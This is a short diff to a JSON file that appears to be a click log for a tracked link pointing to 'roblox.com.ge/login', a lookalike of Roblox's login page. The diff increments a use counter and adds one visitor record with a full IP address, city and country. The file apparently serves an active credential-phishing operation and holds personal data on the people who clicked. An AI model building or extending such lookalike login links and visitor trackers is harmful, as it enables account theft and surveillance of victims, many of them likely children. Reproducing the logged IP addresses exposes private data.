@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1072,
+    "useCount": 1073,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8696,6 +8696,14 @@
         "city": "Itapejara d'Oeste",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777247924139,
+        "ip": "222.127.70.66",
+        "country": "Philippines",
+        "city": "Lahug",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
